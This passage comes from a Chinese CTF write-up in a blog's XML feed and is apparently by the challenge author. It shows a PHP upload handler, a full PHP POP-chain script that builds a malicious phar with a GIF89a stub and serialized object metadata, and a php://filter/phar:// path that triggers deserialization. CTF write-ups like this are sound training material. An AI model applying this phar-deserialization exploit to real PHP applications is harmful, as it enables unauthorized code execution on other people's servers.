class="string">&quot;size&quot;</span>] &lt; <span class="number">204800</span>) &amp;&amp; <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$fileTmpName</span>)) &#123;</span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$fileError</span> === <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="variable">$fileContent</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$fileTmpName</span>);</span><br><span class="line">               <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;./uploads/temp.log&quot;</span>, <span class="string">&quot;koishi like this:&quot;</span> . <span class="variable">$fileContent</span>);</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1 style=&#x27;color: sandybrown&#x27;&gt;koishi like this!!!&lt;/h1&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1 style=&#x27;color: red&#x27;&gt;badbad, koishi hate!&lt;/h1&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1 style=&#x27;color: red&#x27;&gt;badbad, koishi hate!&lt;/h1&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<p>所以我们需要进行简单的绕过，最终构造的pop链如下：</p>
<h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$Neepu</span> = <span class="keyword">new</span> <span class="title class_">Neepu</span>();</span><br><span class="line"><span class="variable">$Shruti</span> = <span class="keyword">new</span> <span class="title class_">Shruti</span>();</span><br><span class="line"><span class="variable">$NewYear</span> = <span class="keyword">new</span> <span class="title class_">NewYear</span>();</span><br><span class="line"><span class="variable">$Koishi</span> = <span class="keyword">new</span> <span class="title class_">Koishi</span>();</span><br><span class="line"><span class="variable">$Obsolescent</span> = <span class="keyword">new</span> <span class="title class_">Obsolescent</span>();</span><br><span class="line"><span class="variable">$Neepu</span>-&gt;n = <span class="variable">$Shruti</span>;</span><br><span class="line"><span class="variable">$Shruti</span>-&gt;r = <span class="variable">$NewYear</span>;</span><br><span class="line"><span class="variable">$NewYear</span>-&gt;nYear = <span class="variable">$Koishi</span>;</span><br><span class="line"><span class="variable">$Koishi</span>-&gt;kk = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="variable">$Koishi</span>-&gt;ii = <span class="keyword">array</span>(<span class="string">&quot;b&quot;</span>);</span><br><span class="line"><span class="variable">$Koishi</span>-&gt;ss = <span class="variable">$Obsolescent</span>;</span><br><span class="line"><span class="variable">$Obsolescent</span>-&gt;o = <span class="variable">$Neepu</span>;</span><br><span class="line"><span class="variable">$Neepu</span>-&gt;ne = <span class="variable">$NewYear</span>;</span><br><span class="line"><span class="variable">$Neepu</span>-&gt;nee = <span class="string">&quot;ObSOLEScEnt::nOWay&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;success.phar&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) ? <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>) : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;koishi like this:GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$Neepu</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;koishi.txt&quot;</span>,<span class="string">&quot;hello shruti&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>),<span class="title function_ invoke__">strlen</span>(<span class="string">&quot;koishi like this:&quot;</span>));</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$filename</span>&quot;</span>,<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure></div>



<p>检查文件类型时需要包含 Ko1sh1 内容，由于filter对于过滤器的处理不严格，当过滤器存在异常内容时只会出现 Warming 提示，而不会终止程序，而mime_content_type也支持伪协议，所以最终我们使用的payload如下。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/Ko1sh1/resource=phar:///tmp/temp.log/koishi.txt</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240208002213628.png"
                      alt="image-20240208002213628"
                ></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>联赛</category>
      </categories>
      <tags>
        <tag>出题</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
</search>
